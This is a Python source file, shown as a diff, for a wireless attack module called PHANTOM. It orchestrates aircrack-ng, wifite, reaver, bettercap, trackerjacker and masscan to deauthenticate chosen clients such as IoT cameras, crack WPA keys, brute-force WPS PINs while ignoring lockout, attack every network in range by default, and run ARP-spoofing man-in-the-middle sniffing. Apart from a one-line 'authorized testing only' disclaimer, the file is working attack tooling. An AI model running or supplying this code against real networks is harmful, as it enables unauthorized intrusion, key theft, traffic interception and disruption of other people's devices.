@@ -1,0 +1,677 @@
+"""
+PHANTOM - Wireless Attack Module
+Integrates: trackerjacker, masscan, aircrack-ng suite, wifite, reaver, bettercap, wifiphisher
+
+IMPORTANT: For authorized security testing only
+Requires root/sudo privileges
+"""
+
+import subprocess
+import threading
+import time
+import json
+import re
+import os
+from typing import Dict, List, Optional, Callable
+from datetime import datetime
+from collections import defaultdict
+import logging
+
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger(__name__)
+
+class WirelessToolManager:
+    """
+    Manages wireless interface state and tool conflicts
+    Ensures only compatible tools run simultaneously
+    """
+    
+    def __init__(self, interface: str = "wlan1"):
+        self.interface = interface
+        self.monitor_interface = None
+        self.is_monitor_mode = False
+        self.active_tools = set()
+        self.lock = threading.Lock()
+        
+        # Tool compatibility matrix (which tools can run together)
+        self.compatible_tools = {
+            "trackerjacker": ["masscan", "nmap"],
+            "airodump-ng": ["aireplay-ng"],
+            "wifite": [],  # Runs alone
+            "reaver": [],  # Runs alone
+            "bettercap": ["masscan", "nmap"],
+            "wifiphisher": []  # Runs alone
+        }
+    
+    def enable_monitor_mode(self) -> tuple[bool, str]:
+        """Enable monitor mode on wireless interface"""
+        
+        with self.lock:
+            if self.is_monitor_mode:
+                return True, f"Already in monitor mode: {self.monitor_interface}"
+            
+            try:
+                # Kill interfering processes
+                log.info("Killing interfering processes...")
+                subprocess.run(["airmon-ng", "check", "kill"], 
+                             stdout=subprocess.DEVNULL, 
+                             stderr=subprocess.DEVNULL)
+                
+                # Enable monitor mode
+                log.info(f"Enabling monitor mode on {self.interface}...")
+                result = subprocess.run(
+                    ["airmon-ng", "start", self.interface],
+                    capture_output=True,
+                    text=True
+                )
+                
+                # Parse output to find monitor interface name
+                output = result.stdout
+                match = re.search(r'monitor mode (?:vif )?enabled .*on (\w+)', output)
+                
+                if match:
+                    self.monitor_interface = match.group(1)
+                    self.is_monitor_mode = True
+                    log.info(f"Monitor mode enabled: {self.monitor_interface}")
+                    return True, self.monitor_interface
+                else:
+                    # Try common monitor interface names
+                    possible_names = [f"{self.interface}mon", "mon0", "wlan1mon"]
+                    for name in possible_names:
+                        if self._interface_exists(name):
+                            self.monitor_interface = name
+                            self.is_monitor_mode = True
+                            log.info(f"Found monitor interface: {name}")
+                            return True, name
+                    
+                    return False, "Failed to enable monitor mode"
+                    
+            except Exception as e:
+                return False, f"Error enabling monitor mode: {e}"
+    
+    def disable_monitor_mode(self) -> tuple[bool, str]:
+        """Disable monitor mode and restore managed mode"""
+        
+        with self.lock:
+            if not self.is_monitor_mode:
+                return True, "Not in monitor mode"
+            
+            try:
+                log.info("Disabling monitor mode...")
+                subprocess.run(
+                    ["airmon-ng", "stop", self.monitor_interface],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                
+                # Restart NetworkManager
+                subprocess.run(
+                    ["systemctl", "restart", "NetworkManager"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                
+                self.is_monitor_mode = False
+                self.monitor_interface = None
+                log.info("Monitor mode disabled")
+                return True, "Monitor mode disabled"
+                
+            except Exception as e:
+                return False, f"Error disabling monitor mode: {e}"
+    
+    def _interface_exists(self, interface: str) -> bool:
+        """Check if network interface exists"""
+        try:
+            result = subprocess.run(
+                ["ip", "link", "show", interface],
+                capture_output=True,
+                stderr=subprocess.DEVNULL
+            )
+            return result.returncode == 0
+        except:
+            return False
+    
+    def can_run_tool(self, tool_name: str) -> tuple[bool, str]:
+        """Check if tool can run with currently active tools"""
+        
+        with self.lock:
+            if not self.active_tools:
+                return True, "No tools running"
+            
+            compatible = self.compatible_tools.get(tool_name, [])
+            
+            for active in self.active_tools:
+                if active not in compatible:
+                    return False, f"Conflicts with running tool: {active}"
+            
+            return True, "Compatible"
+    
+    def register_tool(self, tool_name: str):
+        """Register tool as active"""
+        with self.lock:
+            self.active_tools.add(tool_name)
+    
+    def unregister_tool(self, tool_name: str):
+        """Unregister tool"""
+        with self.lock:
+            self.active_tools.discard(tool_name)
+
+class TrackerJackerIntegration:
+    """Trackerjacker - WiFi device tracking"""
+    
+    def __init__(self, interface: str):
+        self.interface = interface
+        self.devices = {}
+        self.running = False
+        self.thread = None
+    
+    def start_tracking(self, callback: Optional[Callable] = None):
+        """Start tracking WiFi devices"""
+        
+        if self.running:
+            return False, "Already running"
+        
+        self.running = True
+        self.thread = threading.Thread(
+            target=self._track_devices,
+            args=(callback,),
+            daemon=True
+        )
+        self.thread.start()
+        return True, "Tracking started"
+    
+    def _track_devices(self, callback):
+        """Track devices using trackerjacker"""
+        
+        try:
+            cmd = [
+                "trackerjacker",
+                "-i", self.interface,
+                "--map",
+                "-t", "60"  # 60 second intervals
+            ]
+            
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            for line in process.stdout:
+                if not self.running:
+                    process.kill()
+                    break
+                
+                # Parse trackerjacker output
+                device_info = self._parse_trackerjacker_line(line)
+                if device_info and callback:
+                    callback(device_info)
+                    
+        except Exception as e:
+            log.error(f"Trackerjacker error: {e}")
+    
+    def _parse_trackerjacker_line(self, line: str) -> Optional[Dict]:
+        """Parse trackerjacker output line"""
+        # Implementation depends on trackerjacker output format
+        return None
+    
+    def stop_tracking(self):
+        """Stop tracking"""
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=5)
+        return True, "Tracking stopped"
+    
+    def get_devices(self) -> List[Dict]:
+        """Get tracked devices"""
+        return list(self.devices.values())
+    
+    def deauth_device(self, mac_address: str, ap_mac: str) -> tuple[bool, str]:
+        """Deauth a specific device (IoT camera, etc.)"""
+        
+        try:
+            cmd = [
+                "aireplay-ng",
+                "--deauth", "10",  # 10 deauth packets
+                "-a", ap_mac,      # AP MAC
+                "-c", mac_address,  # Client MAC
+                self.interface
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, timeout=15)
+            
+            if result.returncode == 0:
+                return True, f"Deauth attack sent to {mac_address}"
+            else:
+                return False, "Deauth failed"
+                
+        except Exception as e:
+            return False, f"Error: {e}"
+
+class MasscanIntegration:
+    """Masscan - Ultra-fast port scanner"""
+    
+    @staticmethod
+    def scan_network(network: str, ports: str = "1-65535", 
+                     rate: int = 10000) -> Dict:
+        """
+        Scan network with masscan
+        
+        Args:
+            network: CIDR notation (e.g., 192.168.1.0/24)
+            ports: Port range (e.g., "1-1000,3389,8080")
+            rate: Packets per second (default 10000)
+        """
+        
+        try:
+            cmd = [
+                "masscan",
+                network,
+                "-p", ports,
+                "--rate", str(rate),
+                "-oJ", "-"  # Output JSON to stdout
+            ]
+            
+            log.info(f"Starting masscan: {network} ports {ports}")
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=300  # 5 min timeout
+            )
+            
+            if result.returncode != 0:
+                return {"error": result.stderr}
+            
+            # Parse JSON output
+            hosts = defaultdict(list)
+            for line in result.stdout.split('\n'):
+                if line.strip() and not line.startswith('#'):
+                    try:
+                        data = json.loads(line.rstrip(','))
+                        ip = data.get('ip')
+                        port = data['ports'][0]['port']
+                        hosts[ip].append(port)
+                    except:
+                        continue
+            
+            return {
+                "scan_time": datetime.utcnow().isoformat(),
+                "network": network,
+                "hosts_found": len(hosts),
+                "hosts": dict(hosts)
+            }
+            
+        except subprocess.TimeoutExpired:
+            return {"error": "Scan timeout"}
+        except Exception as e:
+            return {"error": str(e)}
+
+class AircrackSuiteIntegration:
+    """Aircrack-ng suite integration"""
+    
+    def __init__(self, interface: str):
+        self.interface = interface
+        self.capture_file = None
+        self.capture_process = None
+    
+    def start_capture(self, channel: Optional[int] = None,
+                     output_prefix: str = "capture") -> tuple[bool, str]:
+        """Start airodump-ng capture"""
+        
+        if self.capture_process:
+            return False, "Capture already running"
+        
+        try:
+            cmd = ["airodump-ng", "-w", output_prefix, "--output-format", "pcap"]
+            
+            if channel:
+                cmd.extend(["-c", str(channel)])
+            
+            cmd.append(self.interface)
+            
+            self.capture_process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            self.capture_file = f"{output_prefix}-01.cap"
+            return True, f"Capture started: {self.capture_file}"
+            
+        except Exception as e:
+            return False, f"Error: {e}"
+    
+    def stop_capture(self) -> tuple[bool, str]:
+        """Stop capture"""
+        
+        if not self.capture_process:
+            return False, "No capture running"
+        
+        self.capture_process.terminate()
+        self.capture_process.wait(timeout=5)
+        self.capture_process = None
+        
+        return True, f"Capture saved: {self.capture_file}"
+    
+    def crack_wpa(self, capture_file: str, wordlist: str,
+                  essid: str) -> tuple[bool, str]:
+        """Crack WPA key using aircrack-ng"""
+        
+        try:
+            cmd = [
+                "aircrack-ng",
+                "-w", wordlist,
+                "-e", essid,
+                capture_file
+            ]
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=3600  # 1 hour timeout
+            )
+            
+            # Parse output for key
+            if "KEY FOUND" in result.stdout:
+                match = re.search(r'KEY FOUND! \[ (.+) \]', result.stdout)
+                if match:
+                    key = match.group(1)
+                    return True, f"Key found: {key}"
+            
+            return False, "Key not found"
+            
+        except subprocess.TimeoutExpired:
+            return False, "Cracking timeout"
+        except Exception as e:
+            return False, f"Error: {e}"
+
+class WifiteIntegration:
+    """Wifite - Automated wireless attacks"""
+    
+    @staticmethod
+    def run_automated_attack(interface: str, targets: Optional[List[str]] = None,
+                            timeout: int = 600) -> Dict:
+        """
+        Run wifite automated attack
+        
+        Args:
+            interface: Monitor mode interface
+            targets: List of SSIDs to target (None = attack all)
+            timeout: Max runtime in seconds
+        """
+        
+        try:
+            cmd = ["wifite", "-i", interface, "--kill"]
+            
+            if targets:
+                for ssid in targets:
+                    cmd.extend(["--essid", ssid])
+            
+            log.info(f"Starting wifite on {interface}")
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            
+            # Parse results
+            cracked = []
+            for line in result.stdout.split('\n'):
+                if "cracked" in line.lower():
+                    cracked.append(line.strip())
+            
+            return {
+                "success": result.returncode == 0,
+                "cracked_networks": cracked,
+                "output": result.stdout
+            }
+            
+        except subprocess.TimeoutExpired:
+            return {"error": "Timeout", "success": False}
+        except Exception as e:
+            return {"error": str(e), "success": False}
+
+class ReaverIntegration:
+    """Reaver - WPS PIN attacks"""
+    
+    @staticmethod
+    def attack_wps(interface: str, bssid: str, channel: int,
+                   timeout: int = 3600) -> tuple[bool, Optional[str]]:
+        """
+        Brute force WPS PIN
+        
+        Args:
+            interface: Monitor mode interface
+            bssid: Target AP BSSID
+            channel: WiFi channel
+            timeout: Max attack time
+        """
+        
+        try:
+            cmd = [
+                "reaver",
+                "-i", interface,
+                "-b", bssid,
+                "-c", str(channel),
+                "-vv",
+                "-L",  # Ignore locked state
+                "-N",  # Don't send NACK
+            ]
+            
+            log.info(f"Starting Reaver against {bssid}")
+            
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+            
+            start_time = time.time()
+            pin = None
+            
+            for line in process.stdout:
+                # Check timeout
+                if time.time() - start_time > timeout:
+                    process.kill()
+                    return False, "Timeout"
+                
+                # Look for PIN
+                if "WPS PIN:" in line:
+                    match = re.search(r'WPS PIN: (\d+)', line)
+                    if match:
+                        pin = match.group(1)
+                        process.kill()
+                        return True, pin
+            
+            return False, None
+            
+        except Exception as e:
+            return False, str(e)
+
+class BettercapIntegration:
+    """Bettercap - MITM and automation framework"""
+    
+    def __init__(self, interface: str):
+        self.interface = interface
+        self.process = None
+        self.caplet_file = None
+    
+    def start_mitm(self, targets: Optional[List[str]] = None,
+                   enable_sniffer: bool = True) -> tuple[bool, str]:
+        """Start MITM attack"""
+        
+        if self.process:
+            return False, "Already running"
+        
+        try:
+            # Create caplet
+            caplet = self._create_mitm_caplet(targets, enable_sniffer)
+            self.caplet_file = "/tmp/bettercap_mitm.cap"
+            
+            with open(self.caplet_file, 'w') as f:
+                f.write(caplet)
+            
+            cmd = [
+                "bettercap",
+                "-iface", self.interface,
+                "-caplet", self.caplet_file
+            ]
+            
+            self.process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            return True, "MITM attack started"
+            
+        except Exception as e:
+            return False, f"Error: {e}"
+    
+    def _create_mitm_caplet(self, targets: Optional[List[str]], 
+                           enable_sniffer: bool) -> str:
+        """Create bettercap caplet script"""
+        
+        caplet = []
+        caplet.append("# PHANTOM Bettercap Caplet")
+        caplet.append("net.probe on")
+        caplet.append("net.recon on")
+        
+        if targets:
+            caplet.append(f"set arp.spoof.targets {','.join(targets)}")
+        
+        caplet.append("arp.spoof on")
+        
+        if enable_sniffer:
+            caplet.append("net.sniff on")
+            caplet.append("set net.sniff.verbose true")
+        
+        return '\n'.join(caplet)
+    
+    def stop_mitm(self) -> tuple[bool, str]:
+        """Stop MITM attack"""
+        
+        if not self.process:
+            return False, "Not running"
+        
+        self.process.terminate()
+        self.process.wait(timeout=10)
+        self.process = None
+        
+        if self.caplet_file and os.path.exists(self.caplet_file):
+            os.remove(self.caplet_file)
+        
+        return True, "MITM stopped"
+    
+    def wifi_deauth(self, target_bssid: str, 
+                    target_client: Optional[str] = None) -> tuple[bool, str]:
+        """WiFi deauth using bettercap"""
+        
+        try:
+            cmd = ["bettercap", "-iface", self.interface, "-eval"]
+            
+            if target_client:
+                eval_cmd = f"wifi.deauth {target_bssid} {target_client}"
+            else:
+                eval_cmd = f"wifi.deauth {target_bssid}"
+            
+            cmd.append(eval_cmd)
+            
+            result = subprocess.run(cmd, capture_output=True, timeout=30)
+            
+            if result.returncode == 0:
+                return True, "Deauth sent"
+            else:
+                return False, "Deauth failed"
+                
+        except Exception as e:
+            return False, f"Error: {e}"
+
+class WirelessAttackOrchestrator:
+    """
+    Orchestrates all wireless attack tools
+    Manages tool lifecycle and conflicts
+    """
+    
+    def __init__(self, interface: str = "wlan1"):
+        self.interface = interface
+        self.tool_manager = WirelessToolManager(interface)
+        
+        # Initialize tool integrations
+        self.trackerjacker = None
+        self.masscan = MasscanIntegration()
+        self.aircrack = None
+        self.wifite = WifiteIntegration()
+        self.reaver = ReaverIntegration()
+        self.bettercap = None
+        
+        self.device_callbacks = []
+    
+    def initialize(self) -> tuple[bool, str]:
+        """Initialize wireless tools"""
+        
+        # Enable monitor mode
+        success, msg = self.tool_manager.enable_monitor_mode()
+        if not success:
+            return False, f"Failed to enable monitor mode: {msg}"
+        
+        monitor_iface = self.tool_manager.monitor_interface
+        
+        # Initialize tools with monitor interface
+        self.trackerjacker = TrackerJackerIntegration(monitor_iface)
+        self.aircrack = AircrackSuiteIntegration(monitor_iface)
+        self.bettercap = BettercapIntegration(monitor_iface)
+        
+        log.info("Wireless attack orchestrator initialized")
+        return True, f"Initialized on {monitor_iface}"
+    
+    def shutdown(self) -> tuple[bool, str]:
+        """Shutdown all tools and restore interface"""
+        
+        # Stop any running tools
+        if self.trackerjacker:
+            self.trackerjacker.stop_tracking()
+        
+        if self.aircrack and self.aircrack.capture_process:
+            self.aircrack.stop_capture()
+        
+        if self.bettercap and self.bettercap.process:
+            self.bettercap.stop_mitm()
+        
+        # Disable monitor mode
+        return self.tool_manager.disable_monitor_mode()
+    
+    def register_device_callback(self, callback: Callable):
+        """Register callback for device discoveries"""
+        self.device_callbacks.append(callback)
+    
+    def start_device_tracking(self):
+        """Start tracking WiFi devices"""
+        
+        def on_device_found(device_info):
+            for callback in self.device_callbacks:
+                try:
+                    callback(device_info)
+                except Exception as e:
+                    log.error(f"Callback error: {e}")
+        
+        return self.trackerjacker.start_tracking(on_device_found)
+    
+    def get_status(self) -> Dict:
+        """Get status of all tools"""
+        
+        return {
+            "monitor_mode": self.tool_manager.is_monitor_mode,
+            "monitor_interface": self.tool_manager.monitor_interface,
+            "active_tools": list(self.tool_manager.active_tools),
+            "trackerjacker_running": self.trackerjacker.running if self.trackerjacker else False,
+            "capture_running": bool(self.aircrack.capture_process) if self.aircrack else False,
+            "bettercap_running": bool(self.bettercap.process) if self.bettercap else False
+        }
